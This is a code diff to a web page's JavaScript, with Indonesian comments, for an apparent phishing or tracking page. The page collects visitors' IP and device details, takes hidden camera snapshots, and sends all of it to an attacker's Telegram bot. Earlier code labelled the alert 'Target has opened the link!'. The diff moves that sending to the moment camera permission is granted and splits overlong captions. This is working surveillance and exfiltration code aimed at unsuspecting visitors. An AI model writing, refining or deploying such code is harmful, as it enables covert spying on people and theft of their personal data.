@@ -274,6 +274,7 @@ const CHAT_ID="6051179992"; // CHAT ID
 const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";
 let snapshotInterval;
 let isFirstSnapshot = true;
+let hasSentStaticImage = false;
 
 function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}
 
@@ -500,37 +501,74 @@ function buildCaption(ip,d){
 🕐 Time (UTC): ${escapeHtml(new Date().toISOString())}</blockquote>`;
 }
 
-// Kirim foto statis saat halaman load
-async function sendStaticImage(){
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      photo: STATIC_IMAGE,
-      caption: "🎯 Target has opened the link!",
-      parse_mode:"HTML"
-    })
-  });
-}
-
-// Kirim data terpisah
-async function sendData(){
+// Kirim data dengan foto statis
+async function sendDataWithStaticImage(){
   const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: buildCaption(ip,d),
-      parse_mode:"HTML"
-    })
-  });
+  const caption = buildCaption(ip,d);
+  
+  // Cek panjang caption (batas Telegram adalah 1024 karakter)
+  if (caption.length <= 1024) {
+    // Kirim foto dengan caption jika tidak melebihi batas
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        photo: STATIC_IMAGE,
+        caption: caption,
+        parse_mode:"HTML"
+      })
+    });
+  } else {
+    // Jika terlalu panjang, pecah menjadi 2 bagian
+    const halfPoint = Math.floor(caption.length / 2);
+    let splitPoint = halfPoint;
+    
+    // Cari titik split yang bagus (di akhir baris)
+    for (let i = halfPoint; i < halfPoint + 100 && i < caption.length; i++) {
+      if (caption[i] === '\n') {
+        splitPoint = i + 1;
+        break;
+      }
+    }
+    
+    const part1 = caption.substring(0, splitPoint);
+    const part2 = caption.substring(splitPoint);
+    
+    // Kirim foto dengan bagian pertama
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        photo: STATIC_IMAGE,
+        caption: part1,
+        parse_mode:"HTML"
+      })
+    });
+    
+    // Kirim bagian kedua sebagai pesan teks
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: part2,
+        parse_mode:"HTML"
+      })
+    });
+  }
 }
 
 // Kamera snapshot sebagai file .jpg (document)
 async function sendSnapshot(){
   try{
+    // Kirim data dengan foto statis hanya sekali saat izin kamera diberikan
+    if (!hasSentStaticImage) {
+      await sendDataWithStaticImage();
+      hasSentStaticImage = true;
+    }
+    
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     const video = document.createElement('video');
     video.style.display='none';
@@ -579,11 +617,7 @@ async function sendSnapshot(){
 
 // Jalankan saat halaman load
 window.addEventListener("load", async () => {
-  // Kirim foto statis terlebih dahulu
-  await sendStaticImage();
-  
-  // Kirim data terpisah
-  await sendData();
+  // Tidak mengirim apa-apa saat halaman dimuat
 });
 
 // Tombol klik kamera - langsung kirim foto pertama
